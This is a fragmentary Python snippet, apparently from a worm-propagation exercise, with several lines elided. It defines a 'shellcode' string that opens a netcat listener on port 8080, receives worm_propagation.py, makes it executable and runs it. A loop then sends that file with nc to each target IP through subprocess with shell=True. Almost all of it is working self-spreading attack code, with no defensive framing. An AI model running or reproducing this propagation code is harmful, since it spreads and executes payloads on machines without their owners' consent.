...
shellcode= (
   ...
   " nc -lnv 8080 > worm_propagation.py; chmod +x               " #as per the approach 2, we are adding the pilot code here
   " worm_propagation.py; ./worm_propagation.py;               *"
...
while True:
    ...
    subprocess.run([f"nc -w5 {targetIP} 8080 < worm_propagation.py"], shell=True) 
